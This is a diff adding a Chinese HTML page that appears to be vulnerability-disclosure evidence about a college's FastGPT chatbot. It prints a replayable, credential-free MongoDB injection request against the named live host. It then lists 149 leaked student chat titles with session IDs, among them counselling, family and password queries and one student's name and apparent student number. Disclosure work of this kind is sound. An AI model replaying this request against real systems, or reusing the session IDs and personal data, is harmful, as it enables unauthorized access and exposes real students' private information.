@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>CNVD 补充证据 — 广西工商职业技术学院 AI 助手未授权数据访问</title>
+<style>
+body { font-family: "Microsoft YaHei", "Segoe UI", sans-serif; margin: 0; background: #eef1f5; color: #1a1a2e; }
+.wrap { max-width: 1080px; margin: 0 auto; padding: 32px; }
+.card { background: #fff; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,.08); padding: 28px 32px; margin-bottom: 24px; }
+h1 { font-size: 22px; margin: 0 0 6px; }
+h2 { font-size: 17px; border-left: 4px solid #c0392b; padding-left: 10px; margin: 22px 0 12px; }
+.sub { color: #666; font-size: 13px; }
+.kv { display: grid; grid-template-columns: 160px 1fr; row-gap: 8px; font-size: 14px; }
+.kv b { color: #555; }
+code, pre { background: #f6f8fa; border: 1px solid #e1e4e8; border-radius: 6px; font-family: Consolas, monospace; }
+pre { padding: 14px; font-size: 13px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+table { width: 100%; border-collapse: collapse; font-size: 13px; }
+th { background: #2d3a4a; color: #fff; padding: 9px 10px; text-align: left; }
+td { border-bottom: 1px solid #e5e8ec; padding: 8px 10px; vertical-align: top; }
+tr:nth-child(even) td { background: #fafbfc; }
+.tt { font-weight: 600; }
+.tm { color: #777; font-family: Consolas, monospace; font-size: 12px; }
+.badge { display: inline-block; background: #fdecea; color: #c0392b; border-radius: 4px; padding: 1px 7px; font-size: 11px; margin-left: 6px; }
+.badge.g { background: #e8f4fd; color: #1a6fa8; }
+.harm li { margin: 7px 0; font-size: 14px; }
+.foot { text-align: center; color: #999; font-size: 12px; padding: 18px; }
+.stat { display: flex; gap: 14px; margin: 12px 0; }
+.stat div { flex: 1; background: #f6f8fa; border: 1px solid #e1e4e8; border-radius: 8px; padding: 12px; text-align: center; }
+.stat b { display: block; font-size: 24px; color: #c0392b; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="card">
+  <h1>漏洞危害补充证明 — 未授权访问高校 AI 平台全部用户聊天记录</h1>
+  <div class="sub">报送单位对应目标：广西工商职业技术学院（ai.gxgsxy.edu.cn）· FastGPT NoSQL 注入（CVE-2026-79483 同类） · 取证时间 2026-10-09 16:40</div>
+</div>
+
+<div class="card">
+  <h2>一、漏洞与目标基本信息</h2>
+  <div class="kv">
+    <b>受影响单位</b><span>广西工商职业技术学院（域名 gxgsxy.edu.cn，广西公办高职院校）</span>
+    <b>漏洞系统</b><span>FastGPT 智能问答助手（部署于该校，对外提供学生事务问答，覆盖证明打印、请假、奖助学金、心理咨询等业务）</span>
+    <b>漏洞类型</b><span>NoSQL 注入（MongoDB 查询注入）→ 未授权访问全部用户聊天记录（CWE-943 / CWE-862）</span>
+    <b>漏洞接口</b><span><code>POST /api/core/chat/getHistories</code></span>
+    <b>触发条件</b><span>无需登录、无需任何凭证，公网直接可发（匿名未授权）</span>
+  </div>
+  <div class="stat">
+    <div><b>373</b><span>未授权可读聊天记录总数</span></div>
+    <div><b>5</b><span>受影响业务应用数</span></div>
+    <div><b>0</b><span>所需权限/凭证</span></div>
+  </div>
+</div>
+
+<div class="card">
+  <h2>二、验证请求（可 1:1 复现）</h2>
+  <pre>POST https://ai.gxgsxy.edu.cn/api/core/chat/getHistories HTTP/1.1
+Host: ai.gxgsxy.edu.cn
+Content-Type: application/json
+
+{"shareId": {"$ne": ""}, "outLinkUid": {"$ne": ""}, "offset": 0, "pageSize": 50}</pre>
+  <div class="sub">响应：HTTP 200，服务端返回 <b>total = 373</b> 条聊天记录，翻页可全部取回（本页实际取回 373 条）。匿名用户本无权访问其中任何一条。</div>
+</div>
+
+<div class="card">
+  <h2>三、未授权获取的全部 373 条用户聊天记录（标题）</h2>
+  <div class="sub" style="margin-bottom:10px">以下为匿名请求直接返回的该校师生真实对话标题。红色标记为<b>涉及学生个人隐私</b>的样本（心理咨询、家庭矛盾、奖助学金、舍友信息、账号密码等），仅标题即已构成个人信息泄露；利用返回的会话 ID 还可进一步读取对话全文。</div>
+  <table>
+    <tr><th style="width:46px">#</th><th>对话标题</th><th style="width:100px">日期</th><th style="width:200px">会话 ID</th></tr>
+    <tr><td>1</td><td class='tt'>大数据技术专业的就业推荐</td><td class='tm'>2026-10-09</td><td class='tm'>oisq0OTiEwJ8iwZLGwGudkQw</td></tr>
+<tr><td>2</td><td class='tt'>怎么在手机下载</td><td class='tm'>2026-10-09</td><td class='tm'>enD0k0iOHbFBjrwvFEx1wxAK</td></tr>
+<tr><td>3</td><td class='tt'>想问一下在学生证明打印申请办理在学证明打</td><td class='tm'>2026-10-09</td><td class='tm'>sWSpv4GH5in0eWf3iZiQ5naR</td></tr>
+<tr><td>4</td><td class='tt'>我想休学 <span class="badge">含个人隐私</span></td><td class='tm'>2026-10-09</td><td class='tm'>fWsZrB7KbOlBZHg4yXRFf5cm</td></tr>
+<tr><td>5</td><td class='tt'>理想体育那个密码的填写规格格式是什么样的 <span class="badge">含个人隐私</span></td><td class='tm'>2026-10-08</td><td class='tm'>ePIXUcEkSs9qfqrgl35PQwfS</td></tr>
+<tr><td>6</td><td class='tt'>在校证明打印是有学校盖章的是吧</td><td class='tm'>2026-10-08</td><td class='tm'>otTh2vuVV7s1OsmyCn88u5lW</td></tr>
+<tr><td>7</td><td class='tt'>普通话什么报名</td><td class='tm'>2026-10-08</td><td class='tm'>jdvvQTpXX2VMf1Mbhy9kKl0t</td></tr>
+<tr><td>8</td><td class='tt'>医务室开到几点</td><td class='tm'>2026-10-08</td><td class='tm'>uFr1mXMsWhShVViSCFfZX5NB</td></tr>
+<tr><td>9</td><td class='tt'>中尧校区心理咨询处联系电话是多少？ <span class="badge">含个人隐私</span></td><td class='tm'>2026-10-08</td><td class='tm'>dihaIDbpeu3UM5h6TuTpZlEG</td></tr>
+<tr><td>10</td><td class='tt'>中尧校区心理咨询处联系电话是多少？ <span class="badge">含个人隐私</span></td><td class='tm'>2026-10-08</td><td class='tm'>hR0cnrC4DXjkwvMW04wr7PwT</td></tr>
+<tr><td>11</td><td class='tt'>校园网账号密码是什么 <span class="badge">含个人隐私</span></td><td class='tm'>2026-10-08</td><td class='tm'>yIcBk0N9Lla6NB5nfPMOCSLt</td></tr>
+<tr><td>12</td><td class='tt'>在哪里发假条给任课老师</td><td class='tm'>2026-10-08</td><td class='tm'>ivGEw4uTlDEhjOgTv8tkVFPj</td></tr>
+<tr><td>13</td><td class='tt'>我是纪检委员  班里有同学请假了 我要怎</td><td class='tm'>2026-10-08</td><td class='tm'>qwYPS4FnF1h7ITYm5bjbVhu4</td></tr>
+<tr><td>14</td><td class='tt'>宿舍房卡不见了在哪里报修？</td><td class='tm'>2026-10-08</td><td class='tm'>zMJGPE0faphX1O4uyZ389lTe</td></tr>
+<tr><td>15</td><td class='tt'>今日校园报修怎么撤销？</td><td class='tm'>2026-10-08</td><td class='tm'>aq0RJhFSCA2bBHURmgh8RlIR</td></tr>
+<tr><td>16</td><td class='tt'>图书馆借书</td><td class='tm'>2026-10-08</td><td class='tm'>gVsMla3BoDkYKsLQxIBUZ9VP</td></tr>
+<tr><td>17</td><td class='tt'>图书馆怎么借书</td><td class='tm'>2026-10-08</td><td class='tm'>hi7OxhYDf5Sx5wfzky1ecfd7</td></tr>
+<tr><td>18</td><td class='tt'>宿舍报修在哪里</td><td class='tm'>2026-10-07</td><td class='tm'>wy52tUu6p8xKP9urcYAC2ywV</td></tr>
+<tr><td>19</td><td class='tt'>没有点击下载几个字</td><td class='tm'>2026-10-07</td><td class='tm'>mngIc9XPL8cJMjxAOVsjB8V1</td></tr>
+<tr><td>20</td><td class='tt'>没有点击下载几个字</td><td class='tm'>2026-10-07</td><td class='tm'>lCynKyK249ajZ0ygj0CYita8</td></tr>
+<tr><td>21</td><td class='tt'>今日校园能改喜鹊儿的手机号嘛 <span class="badge">含个人隐私</span></td><td class='tm'>2026-10-07</td><td class='tm'>odby9HfJ6mfelTevFrvXl56s</td></tr>
+<tr><td>22</td><td class='tt'>《广西工商职业技术学院 2021 年大学</td><td class='tm'>2026-10-07</td><td class='tm'>f2npVB4kJZkiompNrz9IM3k2</td></tr>
+<tr><td>23</td><td class='tt'>怎么打开学信网</td><td class='tm'>2026-10-06</td><td class='tm'>cKFzsa9IrHSrNvDTzhnxxjXH</td></tr>
+<tr><td>24</td><td class='tt'>助学金 <span class="badge">含个人隐私</span></td><td class='tm'>2026-10-06</td><td class='tm'>ucZk6l6aCycUflEtal5o2wKW</td></tr>
+<tr><td>25</td><td class='tt'>教导处电话</td><td class='tm'>2026-10-05</td><td class='tm'>freFFh8mFHsCiZmJ68edOYCK</td></tr>
+<tr><td>26</td><td class='tt'>在校申请打印</td><td class='tm'>2026-10-05</td><td class='tm'>cLqqYvM7vHCnSbDbvdc7d6xM</td></tr>
+<tr><td>27</td><td class='tt'>有没有电子版的录取通知书</td><td class='tm'>2026-10-05</td><td class='tm'>nLiKn8gNfxMqVMD1fTl4JnQq</td></tr>
+<tr><td>28</td><td class='tt'>学生证什么时候可以弄</td><td class='tm'>2026-10-04</td><td class='tm'>qcyL3EAY0eqQyU2vDJLQPiJ0</td></tr>
+<tr><td>29</td><td class='tt'>理想体育的学校编码是什么</td><td class='tm'>2026-10-04</td><td class='tm'>aegtNqSuDuMiXlydywkhpHzX</td></tr>
+<tr><td>30</td><td class='tt'>需要在手机上操作什么嘛</td><td class='tm'>2026-10-03</td><td class='tm'>lJociK29UaH5cJq2Cz9AD7X1</td></tr>
+<tr><td>31</td><td class='tt'>预约</td><td class='tm'>2026-10-03</td><td class='tm'>sr27emaHkqRekwbtd9YgKYkk</td></tr>
+<tr><td>32</td><td class='tt'>家长进校怎么预约</td><td class='tm'>2026-10-03</td><td class='tm'>t116cT86hbHuPalwlurZulA9</td></tr>
+<tr><td>33</td><td class='tt'>手机</td><td class='tm'>2026-10-02</td><td class='tm'>of2y3eDUvvTxRgUJuZ3qW0HW</td></tr>
+<tr><td>34</td><td class='tt'>我喜鹊儿绑定的手机号我不用了我怎么改绑？ <span class="badge">含个人隐私</span></td><td class='tm'>2026-10-02</td><td class='tm'>l6oDtPrg287Nb9H5rsz6bFnx</td></tr>
+<tr><td>35</td><td class='tt'>我是在手机上的</td><td class='tm'>2026-09-30</td><td class='tm'>g8vbtrasaH2gzebn1EXWCVVS</td></tr>
+<tr><td>36</td><td class='tt'>在哪里下载？</td><td class='tm'>2026-09-30</td><td class='tm'>lq3VZfowctsVMGQDVNraGFBf</td></tr>
+<tr><td>37</td><td class='tt'>怎么弄学生证明</td><td class='tm'>2026-09-29</td><td class='tm'>bB97LTRL0UjNriSwlKe5WZLJ</td></tr>
+<tr><td>38</td><td class='tt'>掌阅精选通行码</td><td class='tm'>2026-09-29</td><td class='tm'>hLptiUu75u5qXhiN8N4HrDtc</td></tr>
+<tr><td>39</td><td class='tt'>啥</td><td class='tm'>2026-09-29</td><td class='tm'>wZ0HEYRWV4TWLqmtNVDxcwCD</td></tr>
+<tr><td>40</td><td class='tt'>电费充错了怎么办？</td><td class='tm'>2026-09-29</td><td class='tm'>dJiuZrgbtUVa0kiIFPl8WEpm</td></tr>
+<tr><td>41</td><td class='tt'>我要心理活动中心的照片 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-29</td><td class='tm'>oLLQkFAbExsiOq1PK6o9wFwU</td></tr>
+<tr><td>42</td><td class='tt'>请问补办宿舍房卡在哪里</td><td class='tm'>2026-09-29</td><td class='tm'>qxzB51G5yMMoNTprnujKmGjX</td></tr>
+<tr><td>43</td><td class='tt'>我跟我家人关系不好，我该怎么办</td><td class='tm'>2026-09-29</td><td class='tm'>p4mrZWSeJGKU4ktII146fX5X</td></tr>
+<tr><td>44</td><td class='tt'>进学校可以谈恋爱吗 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-29</td><td class='tm'>p4mrZWSeJGKU4ktII146fX5X</td></tr>
+<tr><td>45</td><td class='tt'>军训免训怎么申请</td><td class='tm'>2026-09-27</td><td class='tm'>bmhC8CG1hzxhVxOescyBK21F</td></tr>
+<tr><td>46</td><td class='tt'>宿舍报修在哪里</td><td class='tm'>2026-09-25</td><td class='tm'>sOYtlsgLZtGsfsURnqOfWrOe</td></tr>
+<tr><td>47</td><td class='tt'>最强学院</td><td class='tm'>2026-09-25</td><td class='tm'>fBqSggMGRp3bCgrZzOGtjMoN</td></tr>
+<tr><td>48</td><td class='tt'>学校的校车在哪里预定？</td><td class='tm'>2026-09-25</td><td class='tm'>wk4USyEECbQ3knL5yvYvAtC6</td></tr>
+<tr><td>49</td><td class='tt'>有电子版录取通知书么</td><td class='tm'>2026-09-24</td><td class='tm'>bsDOiaXiyMeKj6pBlHB4HQ3g</td></tr>
+<tr><td>50</td><td class='tt'>有电子版录取通知书么</td><td class='tm'>2026-09-24</td><td class='tm'>d5gxt5wExW4SLGoFkBAS84aE</td></tr>
+<tr><td>51</td><td class='tt'>想知道舍友信息 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-24</td><td class='tm'>dF1DQJbDvk2pts3imh9P5chI</td></tr>
+<tr><td>52</td><td class='tt'>想知道舍友信息 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-24</td><td class='tm'>afiqjubBJJsZXxRgzTQE7UVw</td></tr>
+<tr><td>53</td><td class='tt'>怎么查询宿舍舍友名字 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-24</td><td class='tm'>mJ9dOnDMTP1OHilGzEU4ac35</td></tr>
+<tr><td>54</td><td class='tt'>体育免修还要跑校园跑吗</td><td class='tm'>2026-09-24</td><td class='tm'>cGE30uyHAXFzd4IyT4Po9akV</td></tr>
+<tr><td>55</td><td class='tt'>我的是导员通过的，然后呢</td><td class='tm'>2026-09-24</td><td class='tm'>e0eotCb38enavzeb8yt7iJhI</td></tr>
+<tr><td>56</td><td class='tt'>？</td><td class='tm'>2026-09-24</td><td class='tm'>nG7LrcXcQY8pkORq64TcpKX5</td></tr>
+<tr><td>57</td><td class='tt'>我的申请在哪里看</td><td class='tm'>2026-09-24</td><td class='tm'>n6QPAR8PQhm7hl1FLbC8TrcA</td></tr>
+<tr><td>58</td><td class='tt'>学生</td><td class='tm'>2026-09-24</td><td class='tm'>jL5MKlaM0cinGeGOH8usYiHq</td></tr>
+<tr><td>59</td><td class='tt'>喜鹊儿密码忘记了，咋办呀 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-24</td><td class='tm'>eWUMJQfq0r7qLLzYyUS0Y7tR</td></tr>
+<tr><td>60</td><td class='tt'>怎么请假</td><td class='tm'>2026-09-24</td><td class='tm'>hFtCqhQYY1Okzcz2we2wyTBn</td></tr>
+<tr><td>61</td><td class='tt'>学生在今日校园申请了在校证明通过后怎么拿</td><td class='tm'>2026-09-24</td><td class='tm'>aJMP8HjlNfuSl6E4o9OPD2wq</td></tr>
+<tr><td>62</td><td class='tt'>在哪里交电费</td><td class='tm'>2026-09-24</td><td class='tm'>vnsGTFWAF4kvV6fvp1nJ1zNs</td></tr>
+<tr><td>63</td><td class='tt'>二课积分48分可以拿励志奖学金吗 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-24</td><td class='tm'>nbiNtWOVnI1lUspC0ZBEda2A</td></tr>
+<tr><td>64</td><td class='tt'>我说的是今日校园怎么请假</td><td class='tm'>2026-09-24</td><td class='tm'>abO27keFbuXBzdEMVlJqUIR2</td></tr>
+<tr><td>65</td><td class='tt'>自助借书机现在坏了吗</td><td class='tm'>2026-09-24</td><td class='tm'>gRuxsnjJc7CbSzKpbIJDgAU4</td></tr>
+<tr><td>66</td><td class='tt'>我是室内艺术设计专业大三学生， 本学期在</td><td class='tm'>2026-09-24</td><td class='tm'>zD2AVLdET0W2anTxRsNxJYOn</td></tr>
+<tr><td>67</td><td class='tt'>怎么充宿舍的电费</td><td class='tm'>2026-09-24</td><td class='tm'>lRKDD5NSeuqu0f8fvH6eODhk</td></tr>
+<tr><td>68</td><td class='tt'>我的辅导员老是已读不回，回消息也不解决问</td><td class='tm'>2026-09-24</td><td class='tm'>daP0J8sCeJwG0ieWJcGl9YsY</td></tr>
+<tr><td>69</td><td class='tt'>在校证明有什么作用</td><td class='tm'>2026-09-24</td><td class='tm'>nrp0SxEAwnDPhvp70skZ2r9j</td></tr>
+<tr><td>70</td><td class='tt'>现在还可以申请体育免考吗</td><td class='tm'>2026-09-24</td><td class='tm'>nPXUx0fuPGgxEChgG8jf9bh1</td></tr>
+<tr><td>71</td><td class='tt'>在校证明申请通过后怎么做</td><td class='tm'>2026-09-23</td><td class='tm'>cQf7K0Cb9qbMVXvoX11SYyDi</td></tr>
+<tr><td>72</td><td class='tt'>在校证明申请通过后怎么做</td><td class='tm'>2026-09-23</td><td class='tm'>uG88jo6xJW5RlpLqH8nkTrOK</td></tr>
+<tr><td>73</td><td class='tt'>我在广西工商职业技术学院武鸣东校区西门7</td><td class='tm'>2026-09-23</td><td class='tm'>eVh42oYRNYWncqxJw6YwlRvF</td></tr>
+<tr><td>74</td><td class='tt'>我在广西工商职业技术学院武鸣东校区西门7</td><td class='tm'>2026-09-23</td><td class='tm'>hO6UwekPfAvViPZ7g3IUV16r</td></tr>
+<tr><td>75</td><td class='tt'>我的埌东汽车站发车时间是10:30，我7</td><td class='tm'>2026-09-23</td><td class='tm'>p0nBf3V4NGq8PzSa7Fb425GN</td></tr>
+<tr><td>76</td><td class='tt'>武鸣</td><td class='tm'>2026-09-23</td><td class='tm'>lXB2hzVWzEFQjBrFpVaf63gF</td></tr>
+<tr><td>77</td><td class='tt'>图书馆借书时间</td><td class='tm'>2026-09-23</td><td class='tm'>hAZXOTfy8ZNh9ibM5Xl28A6p</td></tr>
+<tr><td>78</td><td class='tt'>补办</td><td class='tm'>2026-09-23</td><td class='tm'>fm99INgZqBmmThIYPpHFGP5R</td></tr>
+<tr><td>79</td><td class='tt'>图书馆怎么自助借书</td><td class='tm'>2026-09-23</td><td class='tm'>wMWlk21gPkdSQVcOW0yYIFaJ</td></tr>
+<tr><td>80</td><td class='tt'>怎么补办宿舍卡</td><td class='tm'>2026-09-23</td><td class='tm'>pFziCuJD5l12AjbsOIfc8R3y</td></tr>
+<tr><td>81</td><td class='tt'>我是25号5点的火车票</td><td class='tm'>2026-09-23</td><td class='tm'>lvP1qPKK5xtRfm90wrR9osJc</td></tr>
+<tr><td>82</td><td class='tt'>我是25号5点的火车票</td><td class='tm'>2026-09-23</td><td class='tm'>hocxwf1LlNviusG7TkEDTzd7</td></tr>
+<tr><td>83</td><td class='tt'>中秋国庆回家</td><td class='tm'>2026-09-23</td><td class='tm'>sIXA9ho1euUiR6aUa8jywQs8</td></tr>
+<tr><td>84</td><td class='tt'>请假结束时间应该写多久</td><td class='tm'>2026-09-23</td><td class='tm'>rABSkNI3AHdNYJ4cWRkNxNUI</td></tr>
+<tr><td>85</td><td class='tt'>找不到 但是我发不了截图</td><td class='tm'>2026-09-23</td><td class='tm'>xWRySBr7t1SjsZYcWuyRZDFi</td></tr>
+<tr><td>86</td><td class='tt'>考试排名怎么查</td><td class='tm'>2026-09-23</td><td class='tm'>vPOaWc0C41tGCEopwvCBMTCS</td></tr>
+<tr><td>87</td><td class='tt'>学生证明通过了在哪？</td><td class='tm'>2026-09-23</td><td class='tm'>wadS0umzHUBwG1IbzuiEwGxc</td></tr>
+<tr><td>88</td><td class='tt'>请问我综测专业21名，今年报国家励志有希</td><td class='tm'>2026-09-23</td><td class='tm'>jqF8ShxfEteSZQLWiULb0H9c</td></tr>
+<tr><td>89</td><td class='tt'>请问我综测专业21名，今年报国家励志有希</td><td class='tm'>2026-09-23</td><td class='tm'>pK9fNglksdNrnUtheCsMbwQ9</td></tr>
+<tr><td>90</td><td class='tt'>在校期间获得C1驾驶证可以加分吗，加什么</td><td class='tm'>2026-09-23</td><td class='tm'>uZ4CPHRZze02BZM0uOC2wh0s</td></tr>
+<tr><td>91</td><td class='tt'>学校的校车学生能坐吗</td><td class='tm'>2026-09-23</td><td class='tm'>bNGXbz3VhNH7GyUUUoQC0p9n</td></tr>
+<tr><td>92</td><td class='tt'>学校的校车学生能坐吗</td><td class='tm'>2026-09-23</td><td class='tm'>txHf7KFA0BPH0VKSiRzaItI2</td></tr>
+<tr><td>93</td><td class='tt'>学校的校车学生能坐吗</td><td class='tm'>2026-09-23</td><td class='tm'>fnCv4xQCi5CxAocTzYmyBWJz</td></tr>
+<tr><td>94</td><td class='tt'>怎么弄在校证明</td><td class='tm'>2026-09-23</td><td class='tm'>cfxY4KPObGUBHyaEG8NaT8e5</td></tr>
+<tr><td>95</td><td class='tt'>在电脑上登录怎么在手机上操作退出来</td><td class='tm'>2026-09-23</td><td class='tm'>xjjd1KBd52wb08a1G0xuOZod</td></tr>
+<tr><td>96</td><td class='tt'>在电脑上登录了怎么退出在手机上操作</td><td class='tm'>2026-09-23</td><td class='tm'>joksb38mo2aMyl1XfwbDYpvo</td></tr>
+<tr><td>97</td><td class='tt'>就读证明怎么盖</td><td class='tm'>2026-09-23</td><td class='tm'>rsk3g75imcg12fZl7SIQbS7U</td></tr>
+<tr><td>98</td><td class='tt'>是已通过状态，没有其他显示</td><td class='tm'>2026-09-23</td><td class='tm'>fvWFpAdhhY69FDmphrbvNhf7</td></tr>
+<tr><td>99</td><td class='tt'>假条家长部分格式是什么</td><td class='tm'>2026-09-23</td><td class='tm'>b33TJMhnNGdFdYYrf3diKuux</td></tr>
+<tr><td>100</td><td class='tt'>喜鹊儿登录不上</td><td class='tm'>2026-09-23</td><td class='tm'>dObpXB26bKDuu1OqXOMF0W4z</td></tr>
+<tr><td>101</td><td class='tt'>就读证明怎么弄</td><td class='tm'>2026-09-23</td><td class='tm'>fUfjP0dEweZ4ynHpEcig1Vrg</td></tr>
+<tr><td>102</td><td class='tt'>学校平面图</td><td class='tm'>2026-09-23</td><td class='tm'>a9JpweUnTOEUOMS1LpH3Rexj</td></tr>
+<tr><td>103</td><td class='tt'>喜鹊儿怎么登陆</td><td class='tm'>2026-09-22</td><td class='tm'>n9xxHICH2gpP5KbvZ7OQOGTv</td></tr>
+<tr><td>104</td><td class='tt'>喜鹊儿怎么登陆</td><td class='tm'>2026-09-22</td><td class='tm'>ocX8ArHCyE5LzP4lfOTC6eA9</td></tr>
+<tr><td>105</td><td class='tt'>怎么充电费</td><td class='tm'>2026-09-22</td><td class='tm'>bb2KT18Y1jsZO5HzmqSoQK0w</td></tr>
+<tr><td>106</td><td class='tt'>你能做什么</td><td class='tm'>2026-09-22</td><td class='tm'>xTtYlqDzIytSbO8cifnPqLjv</td></tr>
+<tr><td>107</td><td class='tt'>在校证明审核通过之后在哪里打印？</td><td class='tm'>2026-09-22</td><td class='tm'>apW3eyCbrZbKxropjhlkAbhD</td></tr>
+<tr><td>108</td><td class='tt'>啥都不会</td><td class='tm'>2026-09-22</td><td class='tm'>jNJTTapVoPGvkvEo5CfZkknw</td></tr>
+<tr><td>109</td><td class='tt'>怎么开在校证明？</td><td class='tm'>2026-09-22</td><td class='tm'>m4OGUmKC4OXT03FrzwzpjqZw</td></tr>
+<tr><td>110</td><td class='tt'>招聘信息</td><td class='tm'>2026-09-22</td><td class='tm'>cGLiJMNdG2oxeRDz4uv5QEkY</td></tr>
+<tr><td>111</td><td class='tt'>怎么使用电脑</td><td class='tm'>2026-09-22</td><td class='tm'>k3hetVFwxD658LBiTWlOTE1F</td></tr>
+<tr><td>112</td><td class='tt'>在读证明在哪里申请</td><td class='tm'>2026-09-22</td><td class='tm'>eG6sJ6tGd6hORNIA2y1ExM21</td></tr>
+<tr><td>113</td><td class='tt'>在哪里下载在读证明</td><td class='tm'>2026-09-22</td><td class='tm'>wE5X34WDxvf2xE5U3nFpVjHF</td></tr>
+<tr><td>114</td><td class='tt'>怎么申请体育免测</td><td class='tm'>2026-09-22</td><td class='tm'>eHm6dpzEYmP8HEKeA6krQgSV</td></tr>
+<tr><td>115</td><td class='tt'>为什么我这里没显示</td><td class='tm'>2026-09-22</td><td class='tm'>jO6ze62wpjM4MVeOwb6JqHJc</td></tr>
+<tr><td>116</td><td class='tt'>在校证明怎么查看</td><td class='tm'>2026-09-22</td><td class='tm'>rILGY58meMila4NKXzTF7HxJ</td></tr>
+<tr><td>117</td><td class='tt'>莫惠艳电商2604  202601043</td><td class='tm'>2026-09-22</td><td class='tm'>nKlDqEo1zci3T8fcV171pVrG</td></tr>
+<tr><td>118</td><td class='tt'>去图书馆借书需要什么</td><td class='tm'>2026-09-22</td><td class='tm'>pM98djAEGGHzZpky4ObK0iR4</td></tr>
+<tr><td>119</td><td class='tt'>校历</td><td class='tm'>2026-09-22</td><td class='tm'>aSFkEDqXdHQF2gLjmCZJPlrv</td></tr>
+<tr><td>120</td><td class='tt'>学校校医室可以买药吗</td><td class='tm'>2026-09-22</td><td class='tm'>lQkNHDIfs9NCamF32L4vFhtS</td></tr>
+<tr><td>121</td><td class='tt'>中秋，国庆是连放吗？</td><td class='tm'>2026-09-22</td><td class='tm'>zb28IVx3hFoA0RiVPByIiVTL</td></tr>
+<tr><td>122</td><td class='tt'>电脑室几点开门</td><td class='tm'>2026-09-22</td><td class='tm'>qTIR6RhGjUcdNKci3jpL3vTm</td></tr>
+<tr><td>123</td><td class='tt'>图书馆开放时间</td><td class='tm'>2026-09-22</td><td class='tm'>sfjlHoDFryvosawc1WvwP4eS</td></tr>
+<tr><td>124</td><td class='tt'>？</td><td class='tm'>2026-09-22</td><td class='tm'>gKroBgHNnSvee2SWwCnEeAqD</td></tr>
+<tr><td>125</td><td class='tt'>我要预约学校的健身房怎么办</td><td class='tm'>2026-09-22</td><td class='tm'>s4VQKINsJT0RBvYr9Yt0kYAd</td></tr>
+<tr><td>126</td><td class='tt'>我想问一下水卡去哪里办</td><td class='tm'>2026-09-22</td><td class='tm'>xvkmRwKOBLQ6G4TxhUU1ETba</td></tr>
+<tr><td>127</td><td class='tt'>学校编码是什么</td><td class='tm'>2026-09-22</td><td class='tm'>nP1bHHAFKIPpURSlaQ8b9OWp</td></tr>
+<tr><td>128</td><td class='tt'>理想体育登录不上怎么办</td><td class='tm'>2026-09-22</td><td class='tm'>s8QegHnvjws1NCVP8qleOW2s</td></tr>
+<tr><td>129</td><td class='tt'>可以和国庆一起放假吗？</td><td class='tm'>2026-09-21</td><td class='tm'>wXnluef9kGo7NFZrhcXZULuj</td></tr>
+<tr><td>130</td><td class='tt'>中秋国庆连放吗？</td><td class='tm'>2026-09-21</td><td class='tm'>k66VGkK0XRLsZxrrjEt7AXL8</td></tr>
+<tr><td>131</td><td class='tt'>广西工商放长假有没有门禁？</td><td class='tm'>2026-09-21</td><td class='tm'>rs1U5KhnnhAVMdTESq6ZSSbb</td></tr>
+<tr><td>132</td><td class='tt'>电费在哪里看</td><td class='tm'>2026-09-21</td><td class='tm'>oLUJNSTZeALO1JDAauXAympy</td></tr>
+<tr><td>133</td><td class='tt'>导，实习期间不小心交社保对应届毕业生身份</td><td class='tm'>2026-09-21</td><td class='tm'>sJiKlqOKepeNgdxfkStY5mNp</td></tr>
+<tr><td>134</td><td class='tt'>刚开学一个月可以改名了吗</td><td class='tm'>2026-09-21</td><td class='tm'>smOIwfpVO27kpR4B0E5BtSf2</td></tr>
+<tr><td>135</td><td class='tt'>就读证明在哪里出</td><td class='tm'>2026-09-21</td><td class='tm'>irP4pSgbiOfNABAyIIr6KHdF</td></tr>
+<tr><td>136</td><td class='tt'>打印在校证明获得以上流程指引</td><td class='tm'>2026-09-21</td><td class='tm'>qVFS8hMapt1UWVjpQCzWK95k</td></tr>
+<tr><td>137</td><td class='tt'>打印在校证明</td><td class='tm'>2026-09-21</td><td class='tm'>kUQAfcwDgwcgN3gSU5kbhWSL</td></tr>
+<tr><td>138</td><td class='tt'>理想体育忘记密码怎么办 <span class="badge">含个人隐私</span></td><td class='tm'>2026-09-21</td><td class='tm'>h9qD5JDvj20DAuTjL3HjTQW4</td></tr>
+<tr><td>139</td><td class='tt'>怎么投诉学校</td><td class='tm'>2026-09-21</td><td class='tm'>zNgSaG78F4NZ1r0oZTEYKnE2</td></tr>
+<tr><td>140</td><td class='tt'>宿舍保修在哪里</td><td class='tm'>2026-09-21</td><td class='tm'>eUqoOglz5LbzdBaaWhHELoOO</td></tr>
+<tr><td>141</td><td class='tt'>我的喜鹊儿登不上去了</td><td class='tm'>2026-09-21</td><td class='tm'>pisaWfnvmWZBgAqJb05YvK0p</td></tr>
+<tr><td>142</td><td class='tt'>我想回家</td><td class='tm'>2026-09-21</td><td class='tm'>adVahwhMoIQ0YNBULVwbvZVU</td></tr>
+<tr><td>143</td><td class='tt'>您好</td><td class='tm'>2026-09-21</td><td class='tm'>fdEYeYnaRTdNOJMAJ4ezVyBa</td></tr>
+<tr><td>144</td><td class='tt'>导员你好</td><td class='tm'>2026-09-21</td><td class='tm'>krd0smKKEl9KtO038zF3bQ9o</td></tr>
+<tr><td>145</td><td class='tt'>中秋放假多少天</td><td class='tm'>2026-09-21</td><td class='tm'>piIXTet7s5zHZIR1ST82bTTb</td></tr>
+<tr><td>146</td><td class='tt'>在哪里申请教室</td><td class='tm'>2026-09-21</td><td class='tm'>xc7eeEaDfcojGqErnuF0cm25</td></tr>
+<tr><td>147</td><td class='tt'>为啥中午的走廊插座没有电。我想吹头发都不</td><td class='tm'>2026-09-21</td><td class='tm'>o4kN5jjDi9tl3bDFn495gaxO</td></tr>
+<tr><td>148</td><td class='tt'>😭为什么学校还不发通知</td><td class='tm'>2026-09-21</td><td class='tm'>dZ6N530ot9fw6u37nWhG4hTr</td></tr>
+<tr><td>149</td><td class='tt'>计算机专业在哪个校区</td><td class='tm'>2026-09-21</td><td class='tm'>vUMYIrCTWcY3xF3NJwGaCxlU</td></tr>
